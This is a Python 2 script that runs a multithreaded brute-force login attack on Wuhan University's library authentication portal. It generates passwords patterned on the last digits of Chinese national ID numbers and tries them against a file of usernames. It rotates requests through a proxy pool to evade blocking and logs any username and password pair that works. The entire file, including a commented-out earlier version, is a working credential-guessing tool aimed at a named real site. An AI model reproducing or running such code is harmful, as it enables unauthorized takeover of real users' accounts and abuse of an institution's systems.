# -*- coding: utf-8 -*-
"""
Created on Mon Aug 08 20:03:17 2016

@author: hp
"""
import time
import random
import urllib2
from bs4 import BeautifulSoup
import cookielib
import requests
import threading
from Queue import Queue
from multiprocessing.dummy import Pool
###########################################################
import logging  
import logging.handlers  

log_name=str(int(time.time()))
LOG_FILE = r'E:\whu\%s.log'%log_name
handler = logging.handlers.RotatingFileHandler(LOG_FILE, maxBytes = 1024*1024, backupCount = 5) # 实例化handler   
fmt = '%(asctime)s - %(filename)s:%(lineno)s - %(name)s - %(message)s'  
formatter = logging.Formatter(fmt)   # 实例化formatter  
handler.setFormatter(formatter)      # 为handler添加formatter  
logger = logging.getLogger(log_name)    # 获取名为tst的logger  
logger.addHandler(handler)           # 为logger添加handler  
logger.setLevel(logging.DEBUG)
###############################################################

class Proxy_pool:
    def __init__(self,proxies):
        self.proxy_set=proxies
        self.mark=[0]*len(proxies)
        self.proxy_q=Queue()
        for proxy in proxies:
            self.proxy_q.put(proxy)
    
    def get_element(self):
        return self.proxy_q.get()

    #如果捕捉到是代理ip失效了，就不回收，否则就回收
    def recycle(self,element):
        self.proxy_q.put(element)
    
    def size(self):
        return self.proxy_q.qsize()

lines=open(r'e:\proxy\1470728087.txt').read().split('\n')[:-1]
proxies=[l.split('\t')[0] for l in lines]
proxy_pool=Proxy_pool(proxies)


def adjust_format(n):
    if len(str(n))==1:
        return '00%d'%n
    elif len(str(n))==2:
        return '0%d'%n
    else:
        return str(n)

def produce_password_set():      
    password_set=[]
    number1=['0%d'%i for i in range(1,10)]+[str(i) for i in range(1,32) if i>=10]
    number2=map(adjust_format,range(1,1000))
    number3=[str(i) for i in range(10)]
    number3.append('X')
#    number1=['15']
#    number2=map(adjust_format,range(320,330))
#    number3=['X']
    
    count=0
    for n3 in number3:
        for n1 in number1:
            for n2 in number2:
                password=n1+n2+n3
                password_set.append(password)
                print count,password
                count+=1
    return password_set

password_set=produce_password_set()
lines=open(r'e:\whu\list.txt').read().split('\n')[:-1]
username_set=[l.split('\t')[0] for l in lines]


class Brute:
    def __init__(self,password_set,username_set,thread_num=100):
        self.password_list=password_set
        self.password_q=Queue()
        for p in self.password_list:
            self.password_q.put(p)
        self.usernames=username_set
        self.lock=threading.Lock()
        self.thread_num=thread_num
            
    def check(self,username,password):
        url='http://metalib.lib.whu.edu.cn/pds'
        headers={
                'Referer':'http://metalib.lib.whu.edu.cn/pds',
                'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36'
                }
        
        postdata={
                'func':'login',
                'calling_system':'idp_proxy',
                'term1':'short',
                'selfreg':'',
                'bor_id':username,
                'bor_verification':password,
                'institute':'WHU'    
                }
                
        session=requests.session()
        session.cookies = cookielib.LWPCookieJar()
        while 1:
            try:
                self.lock.acquire()
                p=proxy_pool.get_element()
                ind=proxy_pool.proxy_set.index(p)
                self.lock.release()
                proxy={'http':p}
                response=session.post(url, data=postdata, headers=headers,proxies=proxy)
#                print 'successfully',proxy
                logger.info('successfully',proxy)
                self.lock.acquire()
                if proxy_pool.mark[ind]<=20:
                    proxy_pool.recycle(p)
                self.lock.release()
                break
            except Exception as e:
                proxy_pool.mark[ind]+=1
                logger.info(e)
                logger.info('failed',proxy)
#                print e
#                print 'failed',proxy
        content=response.text
        if content.find('pds_handle')>-1:
            logger.info('>'*40+'successfully!!!!!!!!!!!!'+username+'\t'+password)
        else:
            logger.info('>'*40+'wrong\t'+username+'\t'+password)
            
    def save(self,username,password):
        with open(r'e:\whu\data.txt','w+') as f:
            f.write(username+'\t'+password)
            
    def initialize_password_q(self):
        self.password_q=Queue()
        for p in self.password_list:
            self.password_q.put(p)
        
    def single_check(self,username):
        while not self.password_q.empty():
            self.lock.acquire()
            password=self.password_q.get()
            self.lock.release()
            self.check(username,password)
        
                
    def multi_check(self,username):
        ts=[]
        for _ in range(self.thread_num):
            t=threading.Thread(target=self.single_check,args=(username,))
            ts.append(t)
            t.start()
        for th in ts:
            th.join()
    
    def multi_process(self):
        pool=Pool()
        pool.map(self.multi_check,self.usernames)
    
    def start(self):
        for username in self.usernames:
            self.multi_check(username)
            self.initialize_password_q()
            
if __name__=='__main__':
    b=Brute(password_set,username_set,thread_num=50)
    b.start()


#username=username_set[0]
#for password in password_set:
#    url='http://metalib.lib.whu.edu.cn/pds'
#    headers={
#            'Referer':'http://metalib.lib.whu.edu.cn/pds',
#            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36'
#            }
#    
#    postdata={
#            'func':'login',
#            'calling_system':'idp_proxy',
#            'term1':'short',
#            'selfreg':'',
#            'bor_id':username,
#            'bor_verification':password,
#            'institute':'WHU'    
#            }
#            
#    session=requests.session()
#    session.cookies = cookielib.LWPCookieJar()
#    while 1:
#        try:
#            p=proxy_pool.get_element()
#            proxy={'http':p}
#            response=session.post(url, data=postdata, headers=headers,proxies=proxy)
#            print 'successfully',proxy
#            proxy_pool.recycle(p)
#            break
#        except Exception as e:
#            print 'failed',proxy
#            
#    content=response.text
#    if content.find('pds_handle')>-1:
#        logger.info('>'*20+'successfully!!!!!!!!!!!!'+username+'\t'+password)
#    else:
#        logger.info('failed\t'+username+'\t'+password)

